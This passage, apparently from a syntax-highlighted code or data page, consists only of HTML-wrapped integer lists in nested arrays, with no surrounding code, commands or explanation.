<span class="number">227</span>, <span class="number">1392</span>, <span class="number">1493</span>, <span class="number">748</span>, <span class="number">1671</span>, <span class="number">224</span>, <span class="number">1360</span>, <span class="number">1094</span>, <span class="number">1994</span>, <span class="number">1792</span>, <span class="number">1140</span>, <span class="number">779</span>, <span class="number">1939</span>, <span class="number">361</span>, <span class="number">289</span>, <span class="number">1235</span>, <span class="number">213</span>, <span class="number">517</span>, <span class="number">1485</span>, <span class="number">1390</span>, <span class="number">804</span>, <span class="number">132</span>, <span class="number">920</span>, <span class="number">536</span>, <span class="number">1235</span>, <span class="number">837</span>, <span class="number">298</span>, <span class="number">1139</span>, <span class="number">961</span>, <span class="number">1521</span>, <span class="number">431</span>, <span class="number">76</span>, <span class="number">2019</span>, <span class="number">884</span>, <span class="number">1991</span>, <span class="number">522</span>, <span class="number">342</span>, <span class="number">1609</span>], [<span class="number">114</span>, <span class="number">1608</span>, <span class="number">1127</span>, <span class="number">722</span>, <span class="number">97</span>, <span class="number">140</span>, <span class="number">218</span>, <span class="number">617</span>, <span class="number">475</span>, <span class="number">1680</span>, <span class="number">214</span>, <span class="number">1595</span>, <span class="number">1373</span>, <span class="number">2021</span>, <span class="number">1031</span>, <span class="number">1243</span>, <span class="number">1526</span>, <span class="number">1562</span>, <span class="number">134</span>, <span class="number">684</span>, <span class="number">1178</span>, <span class="number">951</span>, <span class="number">1470</span>, <span class="number">1293</span>, <span class="number">1562</span>, <span class="number">744</span>, <span class="number">424</span>, <span class="number">336</span>, <span class="number">932</span>, <span class="number">897</span>, <span class="number">42</span>, <span class="number">1968</span>, <span class="number">1144</span>, <span class="number">195</span>, <span class="number">686</span>, <span class="number">46</span>, <span class="number">1032</span>, <span class="number">230</span>, <span class="number">1285</span>, <span class="number">132</span>, <span class="number">1514</span>, <span class="number">169</span>], [<span class="number">1870</span>, <span class="number">622</span>, <span class="number">830</span>, <span class="number">283</span>, <span class="number">713</span>, <span class="number">1893</span>, <span class="number">270</span>, <span class="number">573</span>, <span class="number">732</span>, <span class="number">1233</span>, <span class="number">246</span>, <span class="number">1408</span>, <span class="number">1890</span>, <span class="number">119</span>, <span class="number">1529</span>, <span class="number">396</span>, <span class="number">1522</span>, <span class="number">486</span>, <span class="number">1371</span>, <span class="number">211</span>, <span class="number">1196</span>, <span class="number">671</span>, <span class="number">200</span>, <span class="number">1390</span>, <span class="number">1790</span>, <span class="number">547</span>, <span class="number">567</span>, <span class="number">1315</span>, <span class="number">1782</span>, <span class="number">1661</span>, <span class="number">756</span>, <span class="number">6</span>, <span class="number">1864</span>, <span class="number">626</span>, <span class="number">1318</span>, <span class="number">694</span>, <span class="number">1632</span>, <span class="number">1177</span>, <span class="number">1128</span>, <span class="number">1327</span>, <span class="number">405</span>, <span class="number">1283</span>], [<span class="number">1714</span>, <span class="number">277</span>, <span class="number">1154</span>, <span class="number">369</span>, <span class="number">1472</span>, <span class="number">417</span>, <span class="number">541</span>, <span class="number">1244</span>, <span class="number">638</span>, <span class="number">1332</span>, <span class="number">512</span>, <span class="number">492</span>, <span class="number">1272</span>, <span class="number">929</span>, <span class="number">551</span>, <span class="number">34</span>, <span class="number">954</span>, <span class="number">362</span>, <span class="number">75</span>, <span class="number">1009</span>, <span class="number">725</span>, <span class="number">1481</span>, <span class="number">952</span>, <span class="number">1297</span>, <span class="number">1612</span>, <span class="number">289</span>, <span class="number">1684</span>, <span class="number">817</span>, <span class="number">112</span>, <span class="number">1731</span>, <span class="number">837</span>, <span class="number">1820</span>, <span class="number">1457</span>, <span class="number">1411</span>, <span class="number">1836</span>, <span class="number">454</span>, <span class="number">1984</span>, <span class="number">178</span>, <span class="number">46</span>, <span class="number">552</span>, <span class="number">282</span>, <span class="number">720</span>], [<span class="number">1602</span>, <span class="number">921</span>, <span class="number">919</span>, <span class="number">637</span>, <span class="number">25</span>, <span class="number">1052</span>, <span class="number">1246</span>, <span class="number">831</span>, <span class="number">1332</span>, <span class="number">1664</span>, <span class="number">260</span>, <span class="number">1387</span>, <span class="number">1660</span>, <span class="number">19</span>, <span class="number">839</span>, <span class="number">844</span>, <span class="number">1934</span>, <span class="number">1606</span>, <span class="number">970</span>, <span class="number">539</span>, <span class="number">992</span>, <span class="number">1401</span>, <span class="number">1804</span>, <span class="number">1879</span>, <span class="number">297</span>, <span class="number">1325</span>, <span class="number">1671</span>, <span class="number">128</span>, <span class="number">667</span>, <span class="number">1169</span>, <span class="number">808</span>, <span class="number">1238</span>, <span class="number">366</span>, <span class="number">1409</span>, <span class="number">1369</span>, <span class="number">1997</span>, <span class="number">1775</span>, <span class="number">1586</span>, <span class="number">746</span>, <span class="number">278</span>, <span class="number">1134</span>, <span class="number">464</span>], [<span class="number">1441</span>, <span class="number">1529</span>, <span class="number">415</span>, <span class="number">494</span>, <span class="number">1784</span>, <span class="number">1042</span>, <span class="number">799</span>, <span class="number">1701</span>, <span class="number">985</span>, <span class="number">404</span>, <span class="number">734</span>, <span class="number">1123</span>, <span class="number">1206</span>, <span class="number">1493</span>, <span class="number">1446</span>, <span class="number">562</span>, <span class="number">161</span>, <span class="number">1737</span>, <span class="number">1943</span>, <span class="number">753</span>, <span class="number">1782</span>, <span class="number">1341</span>, <span class="number">794</span>, <span class="number">333</span>, <span class="number">891</span>, <span class="number">973</span>, <span class="number">1656</span>, <span class="number">1995</span>, <span class="number">228</span>, <span class="number">523</span>, <span class="number">882</span>, <span class="number">228</span>, <span class="number">1010</span>, <span class="number">212</span>, <span class="number">262</span>, <span class="number">1948</span>, <span class="number">1573</span>, <span class="number">104</span>, <span class="number">767</span>, <span class="number">1607</span>, <span class="number">1333</span>, <span class="number">650</span>], [<span class="number">918</span>, <span class="number">1741</span>, <span class="number">1195</span>, <span class="number">247</span>, <span class="number">2001</span>, <span class="number">1290</span>, <span class="number">1640</span>, <span class="number">1655</span>, <span class="number">1209</span>, <span class="number">1171</span>, <span class="number">1686</span>, <span class="number">1565</span>, <span class="number">1347</span>, <span class="number">1245</span>, <span class="number">350</span>, <span class="number">1234</span>, <span class="number">1271</span>, <span class="number">724</span>, <span class="number">213</span>, <span class="number">1994</span>, <span class="number">974</span>, <span class="number">677</span>, <span class="number">415</span>, <span class="number">1728</span>, <span class="number">1465</span>, <span class="number">222</span>, <span class="number">425</span>, <span class="number">616</span>, <span class="number">1649</span>, <span class="number">1114</span>, <span class="number">285</span>, <span class="number">753</span>, <span class="number">593</span>, <span class="number">1795</span>, <span class="number">552</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">1286</span>, <span class="number">1995</span>, <span class="number">304</span>, <span class="number">402</span>, <span class="number">240</span>], [<span class="number">1870</span>, <span class="number">843</span>, <span class="number">803</span>, <span class="number">905</span>, <span class="number">1256</span>, <span class="number">1668</span>, <span class="number">1850</span>, <span class="number">592</span>, <span class="number">1745</span>, <span class="number">1551</span>, <span class="number">957</span>, <span class="number">1095</span>, <span class="number">1492</span>, <span class="number">1413</span>, <span class="number">1604</span>, <span class="number">1944</span>, <span class="number">1424</span>, <span class="number">543</span>, <span class="number">169</span>, <span class="number">1811</span>, <span class="number">240</span>, <span class="number">996</span>, <span class="number">524</span>, <span class="number">556</span>, <span class="number">1189</span>, <span class="number">746</span>, <span class="number">1166</span>, <span class="number">157</span>, <span class="number">303</span>, <span class="number">965</span>, <span class="number">1848</span>, <span class="number">472</span>, <span class="number">1559</span>, <span class="number">419</span>, <span class="number">932</span>, <span class="number">2022</span>, <span class="number">966</span>, <span class="number">943</span>, <span class="number">1507</span>, <span class="number">1126</span>, <span class="number">1179</span>, <span class="number">1316</span>], [<span class="number">1984</span>, <span class="number">296</span>, <span class="number">1135</span>, <span class="number">779</span>, <span class="number">530</span>, <span class="number">1212</span>, <span class="number">1122</span>, <span class="number">113</span>, <span class="number">805</span>, <span class="number">108</span>, <span class="number">990</span>, <span class="number">897</span>, <span class="number">1372</span>, <span class="number">774</span>, <span class="number">940</span>, <span class="number">633</span>, <span class="number">999</span>, <span class="number">1113</span>, <span class="number">873</span>, <span class="number">1933</span>, <span class="number">233</span>, <span class="number">236</span>, <span class="number">1006</span>, <span class="number">1767</span>, <span class="number">1575</span>, <span class="number">736</span>, <span class="number">1530</span>, <span class="number">843</span>, <span class="number">1373</span>, <span class="number">526</span>, <span class="number">1863</span>, <span class="number">2022</span>, <span class="number">189</span>, <span class="number">291</span>, <span class="number">1746</span>, <span class="number">1804</span>, <span class="number">769</span>, <span class="number">1355</span>, <span class="number">1745</span>, <span class="number">1355</span>, <span class="number">368</span>, <span class="number">666</span>], [<span class="number">1714</span>, <span class="number">1278</span>, <span class="number">333</span>, <span class="number">2002</span>, <span class="number">379</span>, <span class="number">1788</span>, <span class="number">75</span>, <span class="number">174</span>, <span class="number">1369</span>, <span class="number">376</span>, <span class="number">1881</span>, <span class="number">553</span>, <span class="number">928</span>, <span class="number">1269</span>, <span class="number">1930</span>, <span class="number">622</span>, <span class="number">223</span>, <span class="number">278</span>, <span class="number">528</span>, <span class="number">1001</span>, <span class="number">918</span>, <span class="number">1018</span>, <span class="number">903</span>, <span class="number">1133</span>, <span class="number">420</span>, <span class="number">1389</span>, <span class="number">1796</span>, <span class="number">488</span>, <span class="number">410</span>, <span class="number">481</span>, <span class="number">1499</span>, <span class="number">228</span>, <span class="number">811</span>, <span class="number">1539</span>, <span class="number">91</span>, <span class="number">499</span>, <span class="number">1715</span>, <span class="number">249</span>, <span class="number">809</span>, <span class="number">1040</span>, <span class="number">1862</span>, <span class="number">1284</span>], [<span class="number">560</span>, <span class="number">156</span>, <span class="number">1508</span>, <span class="number">1302</span>, <span class="number">194</span>, <span class="number">1062</span>, <span class="number">49</span>, <span class="number">1000</span>, <span class="number">1670</span>, <span class="number">1094</span>, <span class="number">1565</span>, <span class="number">1982</span>, <span class="number">1848</span>, <span class="number">204</span>, <span class="number">1846</span>, <span class="number">1565</span>, <span class="number">186</span>, <span class="number">1701</span>, <span class="number">1233</span>, <span class="number">855</span>, <span class="number">555</span>, <span class="number">938</span>, <span class="number">1489</span>, <span class="number">945</span>, <span class="number">1205</span>, <span class="number">1036</span>, <span class="number">1093</span>, <span class="number">47</span>, <span class="number">416</span>, <span class="number">1832</span>, <span class="number">173</span>, <span class="number">801</span>, <span class="number">684</span>, <span class="number">10</span>, <span class="number">1729</span>, <span class="number">1931</span>, <span class="number">27</span>, <span class="number">461</span>, <span class="number">1619</span>, <span class="number">1468</span>, <span class="number">1069</span>, <span class="number">1455</span>], [<span class="number">270</span>, <span class="number">476</span>, <span class="number">948</span>, <span class="number">1474</span>, <span class="number">1209</span>, <span class="number">1968</span>, <span class="number">1193</span>, <span class="number">1683</span>, <span class="number">223</span>, <span class="number">1220</span>, <span class="number">730</span>, <span class="number">1122</span>, <span class="number">825</span>, <span class="number">1479</span>, <span class="number">922</span>, <span class="number">1684</span>, <span class="number">1526</span>, <span class="number">1532</span>, <span class="number">474</span>, <span class="number">1444</span>, <span class="number">1509</span>, <span class="number">1176</span>, <span class="number">1069</span>, <span class="number">1505</span>, <span class="number">1024</span>, <span class="number">1845</span>, <span class="number">1114</span>, <span class="number">762</span>, <span class="number">428</span>, <span class="number">893</span>, <span class="number">2012</span>, <span class="number">182</span>, <span class="number">1288</span>, <span class="number">851</span>, <span class="number">780</span>, <span class="number">228</span>, <span class="number">1393</span>, <span class="number">1834</span>, <span class="number">314</span>, <span class="number">402</span>, <span class="number">349</span>, <span class="number">189</span>], [<span class="number">1677</span>, <span class="number">1049</span>, <span class="number">606</span>, <span class="number">1404</span>, <span class="number">1606</span>, <span class="number">164</span>, <span class="number">251</span>, <span class="number">1134</span>, <span class="number">893</span>, <span class="number">834</span>, <span class="number">680</span>, <span class="number">1260</span>, <span class="number">1428</span>, <span class="number">1743</span>, <span class="number">1658</span>, <span class="number">298</span>, <span class="number">705</span>, <span class="number">1450</span>, <span class="number">1064</span>, <span class="number">207</span>, <span class="number">787</span>, <span class="number">1094</span>, <span class="number">545</span>, <span class="number">559</span>, <span class="number">131</span>, <span class="number">1110</span>, <span class="number">1402</span>, <span class="number">1671</span>, <span class="number">545</span>, <span class="number">1885</span>, <span class="number">241</span>, <span class="number">525</span>, <span class="number">1333</span>, <span class="number">268</span>, <span class="number">710</span>, <span class="number">1602</span>, <span class="number">925</span>, <span class="number">1713</span>, <span class="number">1390</span>, <span class="number">458</span>, <span class="number">292</span>, <span class="number">1982</span>], [<span class="number">1928</span>, <span class="number">173</span>, <span class="number">1894</span>, <span class="number">177</span>, <span class="number">1485</span>, <span class="number">2019</span>, <span class="number">1602</span>, <span class="number">1975</span>, <span class="number">1394</span>, <span class="number">813</span>, <span class="number">695</span>, <span class="number">998</span>, <span class="number">451</span>, <span class="number">859</span>, <span class="number">1913</span>, <span class="number">1307</span>, <span class="number">1200</span>, <span class="number">1900</span>, <span class="number">193</span>, <span class="number">1288</span>, <span class="number">509</span>, <span class="number">1568</span>, <span class="number">1664</span>, <span class="number">698</span>, <span class="number">1737</span>, <span class="number">1310</span>, <span class="number">1582</span>, <span class="number">634</span>, <span class="number">630</span>, <span class="number">1773</span>, <span class="number">315</span>, <span class="number">1225</span>, <span class="number">955</span>, <span class="number">195</span>, <span class="number">364</span>, <span class="number">1952</span>, <span class="number">1514</span>, <span class="number">107</span>, <span class="number">1103</span>, <span class="number">851</span>, <span class="number">194</span>, <span class="number">782</span>], [<span class="number">264</span>, <span class="number">1210</span>, <span class="number">1424</span>, <span class="number">774</span>, <span class="number">1867</span>, <span class="number">33</span>, <span class="number">1584</span>, <span class="number">76</span>, <span class="number">1170</span>, <span class="number">1217</span>, <span class="number">1404</span>, <span class="number">218</span>, <span class="number">419</span>, <span class="number">1478</span>, <span class="number">1780</span>, <span class="number">600</span>, <span class="number">480</span>, <span class="number">1559</span>, <span class="number">1687</span>, <span class="number">418</span>, <span class="number">963</span>, <span class="number">164</span>, <span class="number">1276</span>, <span class="number">1606</span>, <span class="number">1443</span>, <span class="number">1141</span>, <span class="number">461</span>, <span class="number">586</span>, <span class="number">378</span>, <span class="number">1949</span>, <span class="number">0</span>, <span class="number">224</span>, <span class="number">552</span>, <span class="number">1828</span>, <span class="number">904</span>, <span class="number">804</span>, <span class="number">1040</span>, <span class="number">938</span>, <span class="number">821</span>, <span class="number">2006</span>, <span class="number">109</span>, <span class="number">304</span>], [<span class="number">2005</span>, <span class="number">266</span>, <span class="number">213</span>, <span class="number">970</span>, <span class="number">1085</span>, <span class="number">1140</span>, <span class="number">1224</span>, <span class="number">1869</span>, <span class="number">554</span>, <span class="number">1495</span>, <span class="number">1256</span>, <span class="number">1662</span>, <span class="number">1671</span>, <span class="number">283</span>, <span class="number">281</span>, <span class="number">1432</span>, <span class="number">1107</span>, <span class="number">1460</span>, <span class="number">1535</span>, <span class="number">640</span>, <span class="number">755</span>, <span class="number">1295</span>, <span class="number">1764</span>, <span class="number">1638</span>, <span class="number">1929</span>, <span class="number">1592</span>, <span class="number">724</span>, <span class="number">1120</span>, <span class="number">1132</span>, <span class="number">728</span>, <span class="number">914</span>, <span class="number">930</span>, <span class="number">25</span>, <span class="number">1540</span>, <span class="number">689</span>, <span class="number">1661</span>, <span class="number">1814</span>, <span class="number">1974</span>, <span class="number">1594</span>, <span class="number">1634</span>, <span class="number">1954</span>, <span class="number">1322</span>], [<span class="number">1672</span>, <span class="number">888</span>, <span class="number">1165</span>, <span class="number">368</span>, <span class="number">1940</span>, <span class="number">1662</span>, <span class="number">525</span>, <span class="number">1544</span>, <span class="number">1080</span>, <span class="number">1406</span>, <span class="number">637</span>, <span class="number">415</span>, <span class="number">159</span>, <span class="number">634</span>, <span class="number">309</span>, <span class="number">533</span>, <span class="number">608</span>, <span class="number">1102</span>, <span class="number">1054</span>, <span class="number">1297</span>, <span class="number">1460</span>, <span class="number">471</span>, <span class="number">1199</span>, <span class="number">613</span>, <span class="number">334</span>, <span class="number">1351</span>, <span class="number">1244</span>, <span class="number">333</span>, <span class="number">290</span>, <span class="number">395</span>, <span class="number">829</span>, <span class="number">1531</span>, <span class="number">565</span>, <span class="number">1405</span>, <span class="number">418</span>, <span class="number">1490</span>, <span class="number">279</span>, <span class="number">1690</span>, <span class="number">1435</span>, <span class="number">460</span>, <span class="number">729</span>, <span class="number">139</span>], [<span class="number">49</span>, <span class="number">660</span>, <span class="number">1653</span>, <span class="number">4</span>, <span class="number">1984</span>, <span class="number">169</span>, <span class="number">1900</span>, <span class="number">437</span>, <span class="number">1182</span>, <span class="number">1834</span>, <span class="number">855</span>, <span class="number">335</span>, <span class="number">1494</span>, <span class="number">313</span>, <span class="number">1077</span>, <span class="number">776</span>, <span class="number">61</span>, <span class="number">1220</span>, <span class="number">593</span>, <span class="number">1938</span>, <span class="number">350</span>, <span class="number">1641</span>, <span class="number">295</span>, <span class="number">147</span>, <span class="number">335</span>, <span class="number">1894</span>, <span class="number">86</span>, <span class="number">639</span>, <span class="number">1958</span>, <span class="number">1730</span>, <span class="number">2021</span>, <span class="number">221</span>, <span class="number">1307</span>, <span class="number">1658</span>, <span class="number">103</span>, <span class="number">1697</span>, <span class="number">1900</span>, <span class="number">176</span>, <span class="number">1400</span>, <span class="number">1286</span>, <span class="number">271</span>, <span class="number">744</span>], [<span class="number">856</span>, <span class="number">299</span>, <span class="number">1704</span>, <span class="number">1169</span>, <span class="number">1947</span>, <span class="number">426</span>, <span class="number">2020</span>, <span class="number">518</span>, <span class="number">218</span>, <span class="number">437</span>, <span class="number">731</span>, <span class="number">705</span>, <span class="number">33</span>, <span class="number">455</span>, <span class="number">1382</span>, <span class="number">270</span>, <span class="number">1512</span>, <span class="number">1120</span>, <span class="number">1425</span>, <span class="number">1225</span>, <span class="number">1360</span>, <span class="number">1071</span>, <span class="number">1092</span>, <span class="number">896</span>, <span class="number">1296</span>, <span class="number">1062</span>, <span class="number">1264</span>, <span class="number">396</span>, <span class="number">855</span>, <span class="number">1537</span>, <span class="number">1879</span>, <span class="number">173</span>, <span class="number">1567</span>, <span class="number">1548</span>, <span class="number">228</span>, <span class="number">897</span>, <span class="number">1534</span>, <span class="number">323</span>, <span class="number">744</span>, <span class="number">1564</span>, <span class="number">950</span>, <span class="number">20</span>], [<span class="number">1309</span>, <span class="number">958</span>, <span class="number">2023</span>, <span class="number">811</span>, <span class="number">114</span>, <span class="number">1500</span>, <span class="number">77</span>, <span class="number">1031</span>, <span class="number">1204</span>, <span class="number">1811</span>, <span class="number">1178</span>, <span class="number">877</span>, <span class="number">1304</span>, <span class="number">308</span>, <span class="number">1898</span>, <span class="number">1763</span>, <span class="number">890</span>, <span class="number">1009</span>, <span class="number">631</span>, <span class="number">849</span>, <span class="number">1906</span>, <span class="number">376</span>, <span class="number">1214</span>, <span class="number">426</span>, <span class="number">171</span>, <span class="number">1096</span>, <span class="number">1157</span>, <span class="number">1704</span>, <span class="number">1060</span>, <span class="number">1332</span>, <span class="number">1811</span>, <span class="number">800</span>, <span class="number">712</span>, <span class="number">835</span>, <span class="number">169</span>, <span class="number">1598</span>, <span class="number">1948</span>, <span class="number">1384</span>, <span class="number">1143</span>, <span class="number">1209</span>, <span class="number">1431</span>, <span class="number">574</span>], [<span class="number">1324</span>, <span class="number">725</span>, <span class="number">652</span>, <span class="number">99</span>, <span class="number">1910</span>, <span class="number">522</span>, <span class="number">871</span>, <span class="number">1609</span>, <span class="number">756</span>, <span class="number">1763</span>, <span class="number">1230</span>, <span class="number">1931</span>, <span class="number">487</span>, <span class="number">624</span>, <span class="number">1036</span>, <span class="number">1506</span>, <span class="number">114</span>, <span class="number">575</span>, <span class="number">800</span>, <span class="number">1054</span>, <span class="number">1027</span>, <span class="number">1309</span>, <span class="number">1506</span>, <span class="number">417</span>, <span class="number">1517</span>, <span class="number">270</span>, <span class="number">1610</span>, <span class="number">614</span>, <span class="number">219</span>, <span class="number">1512</span>, <span class="number">882</span>, <span class="number">1457</span>, <span class="number">1798</span>, <span class="number">1262</span>, <span class="number">655</span>, <span class="number">1271</span>, <span class="number">1066</span>, <span class="number">827</span>, <span class="number">1767</span>, <span class="number">1754</span>, <span class="number">1054</span>, <span class="number">345</span>], [<span class="number">221</span>, <span class="number">1642</span>, <span class="number">258</span>, <span class="number">1504</span>, <span class="number">1569</span>, <span class="number">67</span>, <span class="number">57</span>, <span class="number">938</span>, <span class="number">1773</span>, <span class="number">218</span>, <span class="number">1635</span>, <span class="number">1514</span>, <span class="number">1038</span>, <span class="number">884</span>, <span class="number">1686</span>, <span class="number">508</span>, <span class="number">1050</span>, <span class="number">1104</span>, <span class="number">1121</span>, <span class="number">666</span>, <span class="number">887</span>, <span class="number">280</span>, <span class="number">1566</span>, <span class="number">384</span>, <span class="number">1328</span>, <span class="number">1336</span>, <span class="number">1906</span>, <span class="number">1477</span>, <span class="number">1969</span>, <span class="number">760</span>, <span class="number">447</span>, <span class="number">1887</span>, <span class="number">480</span>, <span class="number">92</span>, <span class="number">1959</span>, <span class="number">1917</span>, <span class="number">1132</span>, <span class="number">717</span>, <span class="number">741</span>, <span class="number">1876</span>, <span class="number">579</span>, <span class="number">132</span>], [<span class="number">596</span>, <span class="number">286</span>, <span class="number">1471</span>, <span class="number">1206</span>, <span class="number">1778</span>, <span class="number">1982</span>, <span class="number">835</span>, <span class="number">566</span>, <span class="number">1347</span>, <span class="number">1842</span>, <span class="number">200</span>, <span class="number">675</span>, <span class="number">1659</span>, <span class="number">278</span>, <span class="number">1166</span>, <span class="number">172</span>, <span class="number">1985</span>, <span class="number">316</span>, <span class="number">724</span>, <span class="number">419</span>, <span class="number">1210</span>, <span class="number">800</span>, <span class="number">1637</span>, <span class="number">337</span>, <span class="number">218</span>, <span class="number">2020</span>, <span class="number">1207</span>, <span class="number">1992</span>, <span class="number">1339</span>, <span class="number">1096</span>, <span class="number">331</span>, <span class="number">836</span>, <span class="number">154</span>, <span class="number">854</span>, <span class="number">1242</span>, <span class="number">1069</span>, <span class="number">1290</span>, <span class="number">1428</span>, <span class="number">1024</span>, <span class="number">217</span>, <span class="number">350</span>, <span class="number">281</span>], [<span class="number">1451</span>, <span class="number">1601</span>, <span class="number">1392</span>, <span class="number">472</span>, <span class="number">1165</span>, <span class="number">1190</span>, <span class="number">280</span>, <span class="number">653</span>, <span class="number">953</span>, <span class="number">350</span>, <span class="number">1309</span>, <span class="number">1981</span>, <span class="number">574</span>, <span class="number">1513</span>, <span class="number">1184</span>, <span class="number">2023</span>, <span class="number">1947</span>, <span class="number">591</span>, <span class="number">1745</span>, <span class="number">1305</span>, <span class="number">234</span>, <span class="number">1673</span>, <span class="number">2015</span>, <span class="number">1522</span>, <span class="number">187</span>, <span class="number">1921</span>, <span class="number">32</span>, <span class="number">1185</span>, <span class="number">29</span>, <span class="number">1394</span>, <span class="number">1297</span>, <span class="number">1880</span>, <span class="number">1381</span>, <span class="number">348</span>, <span class="number">622</span>, <span class="number">729</span>, <span class="number">1584</span>, <span class="number">813</span>, <span class="number">937</span>, <span class="number">808</span>, <span class="number">131</span>, <span class="number">1789</span>], [<span class="number">1022</span>, <span class="number">1877</span>, <span class="number">831</span>, <span class="number">1567</span>, <span class="number">408</span>, <span class="number">1465</span>, <span class="number">1073</span>, <span class="number">1942</span>, <span class="number">1418</span>, <span class="number">268</span>, <span class="number">1267</span>, <span class="number">1806</span>, <span class="number">998</span>, <span class="number">6</span>, <span class="number">1366</span>, <span class="number">584</span>, <span class="number">92</span>, <span class="number">1137</span>, <span class="number">529</span>, <span class="number">659</span>, <span class="number">1085</span>, <span class="number">758</span>, <span class="number">2004</span>, <span class="number">384</span>, <span class="number">1099</span>, <span class="number">160</span>, <span class="number">998</span>, <span class="number">1311</span>, <span class="number">1914</span>, <span class="number">1002</span>, <span class="number">308</span>, <span class="number">1399</span>, <span class="number">1325</span>, <span class="number">2023</span>, <span class="number">1357</span>, <span class="number">23</span>, <span class="number">740</span>, <span class="number">223</span>, <span class="number">1865</span>, <span class="number">1</span>, <span class="number">2021</span>, <span class="number">1144</span>], [<span class="number">101</span>, <span class="number">1226</span>, <span class="number">644</span>, <span class="number">128</span>, <span class="number">299</span>, <span class="number">631</span>, <span class="number">139</span>, <span class="number">55</span>, <span class="number">771</span>, <span class="number">409</span>, <span class="number">121</span>, <span class="number">609</span>, <span class="number">966</span>, <span class="number">823</span>, <span class="number">901</span>, <span class="number">556</span>, <span class="number">1396</span>, <span class="number">981</span>, <span class="number">365</span>, <span class="number">339</span>, <span class="number">1373</span>, <span class="number">154</span>, <span class="number">147</span>, <span class="number">1279</span>, <span class="number">1886</span>, <span class="number">1194</span>, <span class="number">1587</span>, <span class="number">311</span>, <span class="number">115</span>, <span class="number">1909</span>, <span class="number">1164</span>, <span class="number">1589</span>, <span class="number">1699</span>, <span class="number">1838</span>, <span class="number">1809</span>, <span class="number">1191</span>, <span class="number">536</span>, <span class="number">1686</span>, <span class="number">476</span>, <span class="number">390</span>, <span class="number">322</span>, <span class="number">1541</span>], [<span class="number">874</span>, <span class="number">903</span>, <span class="number">917</span>, <span class="number">1557</span>, <span class="number">831</span>, <span class="number">1959</span>, <span class="number">1773</span>, <span class="number">930</span>, <span class="number">1513</span>, <span class="number">12</span>, <span class="number">1283</span>, <span class="number">156</span>, <span class="number">606</span>, <span class="number">10</span>, <span class="number">824</span>, <span class="number">1903</span>, <span class="number">1583</span>, <span class="number">752</span>, <span class="number">391</span>, <span class="number">73</span>, <span class="number">1733</span>, <span class="number">296</span>, <span class="number">1958</span>, <span class="number">1206</span>, <span class="number">989</span>, <span class="number">1151</span>, <span class="number">1123</span>, <span class="number">103</span>, <span class="number">1910</span>, <span class="number">1386</span>, <span class="number">940</span>, <span class="number">1522</span>, <span class="number">1883</span>, <span class="number">2009</span>, <span class="number">305</span>, <span class="number">1258</span>, <span class="number">134</span>, <span class="number">353</span>, <span class="number">49</span>, <span class="number">91</span>, <span class="number">1220</span>, <span class="number">124</span>], [<span class="number">387</span>, <span class="number">1884</span>, <span class="number">286</span>, <span class="number">1704</span>, <span class="number">1453</span>, <span class="number">676</span>, <span class="number">543</span>, <span class="number">1445</span>, <span class="number">1130</span>, <span class="number">1136</span>, <span class="number">2010</span>, <span class="number">1428</span>, <span class="number">1146</span>, <span class="number">1190</span>, <span class="number">1355</span>, <span class="number">435</span>, <span class="number">1676</span>, <span class="number">1209</span>, <span class="number">139</span>, <span class="number">1614</span>, <span class="number">1758</span>, <span class="number">726</span>, <span class="number">1139</span>, <span class="number">1050</span>, <span class="number">372</span>, <span class="number">1877</span>, <span class="number">706</span>, <span class="number">1634</span>, <span class="number">881</span>, <span class="number">1067</span>, <span class="number">576</span>, <span class="number">1354</span>, <span class="number">260</span>, <span class="number">848</span>, <span class="number">821</span>, <span class="number">1390</span>, <span class="number">1754</span>, <span class="number">1117</span>, <span class="number">1449</span>, <span class="number">1683</span>, <span class="number">1949</span>, <span class="number">454</span>], [<span class="number">441</span>, <span class="number">1929</span>, <span class="number">845</span>, <span class="number">2013</span>, <span class="number">618</span>, <span class="number">1070</span>, <span class="number">808</span>, <span class="number">836</span>, <span class="number">966</span>, <span class="number">401</span>, <span class="number">1437</span>, <span class="number">1209</span>, <span class="number">387</span>, <span class="number">1093</span>, <span class="number">1339</span>, <span class="number">1748</span>, <span class="number">190</span>, <span class="number">1947</span>, <span class="number">954</span>, <span class="number">1232</span>, <span class="number">1210</span>, <span class="number">1525</span>, <span class="number">724</span>, <span class="number">55</span>, <span class="number">980</span>, <span class="number">1943</span>, <span class="number">1107</span>, <span class="number">1053</span>, <span class="number">1791</span>, <span class="number">1514</span>, <span class="number">306</span>, <span class="number">8</span>, <span class="number">1344</span>, <span class="number">264</span>, <span class="number">140</span>, <span class="number">838</span>, <span class="number">802</span>, <span class="number">424</span>, <span class="number">1540</span>, <span class="number">1747</span>, <span class="number">891</span>, <span class="number">1020</span>], [<span class="number">1048</span>, <span class="number">203</span>, <span class="number">1424</span>, <span class="number">469</span>, <span class="number">1786</span>, <span class="number">591</span>, <span class="number">1997</span>, <span class="number">1687</span>, <span class="number">539</span>, <span class="number">253</span>, <span class="number">278</span>, <span class="number">717</span>, <span class="number">1347</span>, <span class="number">1804</span>, <span class="number">279</span>, <span class="number">806</span>, <span class="number">912</span>, <span class="number">1837</span>, <span class="number">1566</span>, <span class="number">1135</span>, <span class="number">486</span>, <span class="number">1648</span>, <span class="number">1341</span>, <span class="number">1008</span>, <span class="number">637</span>, <span class="number">1699</span>, <span class="number">1396</span>, <span class="number">336</span>, <span class="number">1689</span>, <span class="number">330</span>, <span class="number">1033</span>, <span class="number">128</span>, <span class="number">1161</span>, <span class="number">1647</span>, <span class="number">669</span>, <span class="number">1788</span>, <span class="number">1711</span>, <span class="number">1980</span>, <span class="number">1882</span>, <span class="number">259</span>, <span class="number">138</span>, <span class="number">1467</span>], [<span class="number">861</span>, <span class="number">228</span>, <span class="number">1485</span>, <span class="number">1832</span>, <span class="number">1658</span>, <span class="number">262</span>, <span class="number">1207</span>, <span class="number">719</span>, <span class="number">1982</span>, <span class="number">1108</span>, <span class="number">236</span>, <span class="number">92</span>, <span class="number">1894</span>, <span class="number">669</span>, <span class="number">437</span>, <span class="number">1976</span>, <span class="number">344</span>, <span class="number">2009</span>, <span class="number">1697</span>, <span class="number">874</span>, <span class="number">1486</span>, <span class="number">190</span>, <span class="number">1252</span>, <span class="number">1018</span>, <span class="number">561</span>, <span class="number">375</span>, <span class="number">1908</span>, <span class="number">45</span>, <span class="number">1934</span>, <span class="number">608</span>, <span class="number">1615</span>, <span class="number">658</span>, <span class="number">1234</span>, <span class="number">457</span>, <span class="number">409</span>, <span class="number">26</span>, <span class="number">1388</span>, <span class="number">1959</span>, <span class="number">1126</span>, <span class="number">656</span>, <span class="number">193</span>, <span class="number">507</span>], [<span class="number">1324</span>, <span class="number">508</span>, <span 